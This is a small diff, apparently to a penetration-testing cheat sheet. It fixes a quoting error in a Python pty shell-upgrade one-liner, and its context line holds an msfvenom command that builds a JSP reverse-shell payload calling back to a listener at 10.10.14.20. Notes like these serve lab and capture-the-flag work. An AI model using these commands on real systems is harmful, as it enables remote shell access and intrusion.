@@ -56,7 +56,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f war > rev
 
 
 PYTHON:
-python -c 'import pty; pty.spawn("/bin/bash")
+python -c 'import pty; pty.spawn("/bin/bash")'
 
 or 
 
